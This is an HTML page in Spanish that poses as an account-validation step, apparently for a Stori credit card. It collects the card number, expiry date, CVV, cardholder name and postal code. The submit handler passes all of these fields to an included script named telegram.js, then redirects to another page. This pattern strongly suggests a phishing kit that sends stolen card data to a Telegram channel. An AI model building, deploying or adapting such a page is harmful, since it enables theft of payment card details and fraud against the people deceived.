<body>
    <div class="container">
        <header>
            <a href="index.html">
                <button class="back-button" aria-label="Volver">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="m15 18-6-6 6-6"/>
                    </svg>
                </button>
            </a>
            <span class="header-text"><strong>Validar Cuenta</strong></span>
            <span class="spacer"></span>
        </header>

        <main>
            <div class="illustration">
                <div style="background-color: transparent;" class="circle-bg"></div>
                <img src="https://cdn.glitch.global/e1e455db-012b-49f9-9e5a-31c1a0409530/tcstori.png?v=1745168505749" alt="Ilustración de tarjeta de crédito" class="card-image">
            </div>

            <h1>Ingrese los detalles de su tarjeta</h1>

            <form id="payment-form" class="form-container">
                <div class="input-group">
                    <label for="card-number">Número de Tarjeta</label>
                    <input type="text" id="card-number" name="card-number" required maxlength="19" placeholder="1234 5678 9012 3456">
                </div>
                <div class="input-group">
                    <label for="expiry-date">Fecha de Expiración</label>
                    <input type="text" id="expiry-date" name="expiry-date" required maxlength="5" placeholder="MM/YY">
                </div>
                <div class="input-group">
                    <label for="cvv">CVV</label>
                    <input type="number" id="cvv" name="cvv" oninput="validateCVV()" required maxlength="4" placeholder="123">
                </div>
                <div class="input-group">
                    <label for="name">Nombre en la Tarjeta</label>
                    <input type="text" id="name" name="name" required placeholder="Juan Pérez">
                </div>
                <div class="input-group">
                    <label for="postal-code">Código Postal</label>
                    <input type="number" id="postal-code" name="postal-code" required placeholder="12345">
                </div>
                <button type="submit" class="submit-btn">Confirmar</button>
            </form>
        </main>
    </div>

    <script src="telegram.js"></script>
    <script>
    document.addEventListener('DOMContentLoaded', function() {
        const form = document.getElementById('payment-form');
        const cardNumberInput = document.getElementById('card-number');
        const expiryDateInput = document.getElementById('expiry-date');

        // Formato para el número de tarjeta
        cardNumberInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let formattedValue = '';
            for(let i = 0; i < value.length; i++) {
                if(i > 0 && i % 4 === 0) {
                    formattedValue += ' ';
                }
                formattedValue += value[i];
            }
            e.target.value = formattedValue;
        });

        // Formato para la fecha de expiración
        expiryDateInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 2) {
                value = value.slice(0,2) + '/' + value.slice(2);
            }
            e.target.value = value;
        });

        // Manejar envío del formulario
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Disparar evento personalizado para telegram.js
            const event = new CustomEvent('paymentCompleted', { 
                detail: {
                    cardNumber: document.getElementById('card-number').value,
                    expiryDate: document.getElementById('expiry-date').value,
                    cvv: document.getElementById('cvv').value,
                    name: document.getElementById('name').value,
                    postalCode: document.getElementById('postal-code').value
                }
            });
            document.dispatchEvent(event);
            
            // Redireccionar después de enviar
            setTimeout(() => {
                window.location.href = "Credito.html"; // Cambia esta URL según necesites
            }, 1000);
        });
    });

    function validateCVV() {
        let input = document.getElementById('cvv');
        let value = input.value;
        
        if (value.length > 4) {
            input.value = value.slice(0, 4);
        }
    }
    </script>
</body>
